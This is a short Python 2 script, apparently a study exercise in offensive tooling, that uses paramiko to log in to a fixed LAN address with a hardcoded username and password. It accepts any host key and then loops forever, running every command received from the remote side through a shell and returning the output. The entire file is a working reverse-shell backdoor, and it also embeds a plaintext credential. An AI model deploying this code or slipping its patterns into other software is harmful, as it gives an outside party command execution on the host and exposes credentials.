# -*- encoding: utf-8 -*-


'''
SSH PARAMIKO to BH study.
Today a noobie, tomorrow a god!
'''


import threading
import paramiko
import subprocess


def ssh_command(ip, user, passwd, cmd):
    client = paramiko.SSHClient()
    ssh_session = None

#    client.load_host_keys('/home/unknown/.ssh/known_hosts')
    client.set_missing_host_key_policy( paramiko.AutoAddPolicy() )
    client.connect( ip, username=user, password=passwd )

    ssh_session = client.get_transport().open_session()

    if ssh_session.active:
        ssh_session.send(cmd)
        
        print ssh_session.recv(1024)

        while True:
            cmd_rcv = ssh_session.recv(1024)

            try:
                cmd_out = subprocess.check_output( cmd_rcv, shell=True )

                ssh_session.send(cmd_out)
            except Exception as err:
                ssh_session.send( str(err) )

        client.close()

    return


ssh_command( '192.168.0.3', 'unknown', 'nolerdifwere', 'ClientConected' )


